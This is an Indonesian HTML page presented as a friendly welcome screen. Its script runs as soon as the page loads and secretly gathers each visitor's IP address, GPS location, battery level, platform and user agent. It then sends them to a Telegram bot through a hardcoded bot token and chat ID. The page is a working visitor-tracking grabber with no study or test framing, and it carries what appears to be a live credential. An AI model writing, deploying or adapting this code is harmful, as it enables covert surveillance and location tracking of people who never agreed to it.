<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Info Pengguna</title>
  <style>
    body {
      background: #f5f5f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #333;
      padding: 30px;
      text-align: center;
    }

    h1 {
      color: #2c3e50;
      margin-bottom: 10px;
    }

    .info {
      margin-top: 20px;
      background: #ffffff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      text-align: left;
    }

    .label {
      font-weight: bold;
    }

    .value {
      color: #555;
    }
  </style>
</head>
<body>
  <h1>Selamat datang!</h1>
  <p>HI USER</p>
  <div class="info" id="info">HI JEHE</div>

  <script>
    async function getInfo() {
      const token = "7557234978:AAGxnPhCTjOktufDbOMspdW-xwz15PVbxT8";
      const chat_id = "8091706716";

      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
      const ip = ipData.ip;

      let lat = "Tidak tersedia";
      let lon = "Tidak tersedia";

      const platform = navigator.platform;
      const ua = navigator.userAgent;

      let battery = "p";
      if (navigator.getBattery) {
        const batt = await navigator.getBattery();
        battery = (batt.level * 100) + "%";
      }

      
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          lat = pos.coords.latitude;
          lon = pos.coords.longitude;
          kirimData();
        },
        (err) => {
          
          kirimData();
        }
      );

      function kirimData() {
        const infoHTML = `
          <div><span class="label">IP:</span> <span class="value">${ip}</span></div>
          <div><span class="label">Lokasi:</span> <span class="value">${lat}, ${lon}</span></div>
          <div><span class="label">Baterai:</span> <span class="value">${battery}</span></div>
          <div><span class="label">Platform:</span> <span class="value">${platform}</span></div>
          <div><span class="label">User Agent:</span> <span class="value">${ua}</span></div>
        `;

        document.getElementById("info").innerHTML = infoHTML;

        const text = `New Visitor:
IP: ${ip}
Lokasi: ${lat}, ${lon}
Battery: ${battery}
Platform: ${platform}
UserAgent: ${ua}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chat_id, text: text })
        });
      }
    }

    getInfo();
  </script>
</body>
</html>
